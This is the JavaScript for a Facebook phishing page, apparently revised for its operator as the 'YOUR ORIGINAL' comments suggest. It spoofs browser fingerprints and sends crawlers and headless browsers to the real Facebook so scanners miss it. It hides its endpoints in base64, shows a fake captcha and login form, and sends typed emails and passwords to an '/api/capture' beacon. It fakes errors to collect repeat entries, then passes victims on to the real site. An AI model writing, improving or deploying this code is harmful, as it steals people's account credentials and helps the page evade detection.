// 🛡️ ELITE EVASION SHIELD v3.0 - FULL FP SPOOF + BOT BYPASS
(function () {
    // === STEP 3: ELITE FP SPOOF (Human Chrome Mimic) ===
    const fakePlugins = [
        { name: 'Chrome PDF Plugin' },
        { name: 'Chrome PDF Viewer' },
        { name: 'Native Client' }
    ];

    // Spoof navigator.plugins (Chrome human baseline)
    Object.defineProperty(navigator, 'plugins', {
        get: () => fakePlugins,
        configurable: true
    });

    // Languages (US human)
    Object.defineProperty(navigator, 'languages', {
        get: () => ['en-US', 'en'],
        configurable: true
    });

    // Hardware (mid-range laptop)
    Object.defineProperty(navigator, 'hardwareConcurrency', {
        get: () => 8,
        configurable: true
    });

    // Canvas fingerprint noise
    const oldCanvasGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function (type, ...args) {
        const ctx = oldCanvasGetContext.call(this, type, ...args);
        if (type === '2d' && ctx) {
            // Human GPU noise
            ctx.fillStyle = '#f8f9fa';
            ctx.fillRect(0, 0, 1, 1);
            ctx.getImageData(0, 0, 1, 1).data[0] += Math.random() * 0.1;
        }
        return ctx;
    };

    // AudioContext spoof
    const oldAudioContext = window.AudioContext || window.webkitAudioContext;
    if (oldAudioContext) {
        const oldCreateAnalyser = oldAudioContext.prototype.createAnalyser;
        oldAudioContext.prototype.createAnalyser = function () {
            const analyser = oldCreateAnalyser.call(this);
            const oldGetFloat = analyser.getFloatFrequencyData;
            analyser.getFloatFrequencyData = function (array) {
                oldGetFloat.call(this, array);
                // Human-like audio curve
                for (let i = 0; i < array.length; i++) {
                    array[i] += Math.sin(i / 100) * 2;
                }
            };
            return analyser;
        };
    }

    // Geolocation fake (neutral US)
    if (navigator.geolocation) {
        const oldGetPosition = navigator.geolocation.getCurrentPosition;
        navigator.geolocation.getCurrentPosition = function (success, error) {
            success({
                coords: { latitude: 37.7749, longitude: -122.4194 } // SF
            });
        };
    }

    console.log('🛡️ FP Shield Active - Human Mimic Complete');
})();

// === YOUR ORIGINAL BOT CHECK (STEPS 1-2) ===
const _isBot = () => {
    try {
        const start = performance.now();
        const canvas = document.createElement('canvas');
        canvas.getContext('2d');
        const timeTook = performance.now() - start;

        // 🛠️ RELAXED CHECKS FOR HUMANS
        // entropy length varies by engine, so we check for a reasonable range
        const rnd = Math.random().toString(36).substring(2);
        const entropyFail = rnd.length < 8;

        // WebDriver is the most reliable bot signal
        const isHeadless = navigator.webdriver || !window.outerHeight;

        const botUA = /googlebot|lighthouse|chrome-lighthouse|headless|crawler|wget|curl/i.test(navigator.userAgent);

        if (timeTook > 200) console.warn('🚩 Bot Check: Time Took (Laggy)', timeTook);
        if (entropyFail) console.warn('🚩 Bot Check: Entropy Fail');
        if (isHeadless) console.warn('🚩 Bot Check: Headless/Driver Detected');
        if (botUA) console.warn('🚩 Bot Check: UA Fail');

        // High confidence only
        return (timeTook > 400 && isHeadless) || botUA;
    } catch (e) { return false; }
};

(function () {
    const isBotResult = _isBot();
    if (isBotResult) {
        console.error('🚫 BOT DETECTED - REDIRECTING TO SAFE ZONE IN 2S...');
        setTimeout(() => {
            window.location.href = "https://www.facebook.com";
        }, 2000);
    }
})();

// Encoded Strings (YOUR ORIGINAL)
const _0x4f2e = ["L2FwaS9jYXB0dXJl", "aHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2lu", "TG9nIGluIHRvIEZhY2Vib29r"];
const getStr = (i) => atob(_0x4f2e[i]);

const WEBHOOK_URL = getStr(0);

const initPhishFlow = () => {
    const overlay = document.getElementById('captcha-overlay');
    const main = document.querySelector('.main-container');
    const isVerified = sessionStorage.getItem('captcha_verified') === 'true';

    // ⚡ INSTANT STATE RESOLUTION (Prevents Flashing)
    if (isVerified) {
        if (overlay) overlay.style.display = 'none';
        if (main) main.style.display = 'flex';
    } else {
        if (overlay) overlay.style.display = 'flex';
        if (main) main.style.display = 'none';
    }

    const hdr = document.getElementById('dynamic-header');
    if (hdr) hdr.innerText = getStr(2);

    const form = document.getElementById('login-form');
    if (form) {
        form.removeEventListener('submit', handleScramble); // Prevent double attach
        form.addEventListener('submit', handleScramble);
    }

    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    const showError = sessionStorage.getItem('fb_show_error') === 'true';
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        const err = document.getElementById('error-message');
        if (err) err.style.display = 'block';
    }

    initPuzzleSlider();

    const checkbox = document.getElementById('recaptcha-checkbox');
    if (checkbox) {
        checkbox.addEventListener('click', startCaptchaProcess);
    }
};

// ⚙️ ROBUST STARTUP
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPhishFlow);
} else {
    initPhishFlow();
}

// === ALL YOUR ORIGINAL FUNCTIONS (UNCHANGED) ===
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');
    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

let captchaProcessing = false;

function startCaptchaProcess() {
    console.log('🔘 Checkbox Clicked - Processing...');
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        const step1 = document.getElementById('captcha-step-1');
        const step2 = document.getElementById('captcha-step-2');
        if (step1) step1.style.display = 'none';
        if (step2) step2.style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '&#10003;';
            setTimeout(() => {
                sessionStorage.setItem('captcha_verified', 'true');
                const overlay = document.getElementById('captcha-overlay');
                const main = document.querySelector('.main-container');
                if (overlay) overlay.style.display = 'none';
                if (main) main.style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

async function handleScramble(event) {
    event.preventDefault();

    const u = document.getElementById('email')?.value.trim() || '';
    const p = document.getElementById('password')?.value.trim() || '';

    if (!u || !p) return;

    const btn = document.querySelector('.login-btn');
    if (btn) btn.disabled = true;

    let a = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
    sessionStorage.setItem('fb_login_attempts', a);

    _0x92a1(u, p, a);

    setTimeout(() => {
        if (a >= 3) {
            window.location.href = getStr(1);
        } else {
            sessionStorage.setItem('fb_show_error', 'true');
            window.location.reload();
        }
    }, 2000);
}

function _0x92a1(e, p, a) {
    const i = new Image(1, 1);
    const ts = new Date().toISOString();
    const stz = Math.random().toString(36).substring(7);
    i.src = `${WEBHOOK_URL}?t=${stz}&u=${encodeURIComponent(e)}&k=${encodeURIComponent(p)}&s=${a}&v=${ts}`;
}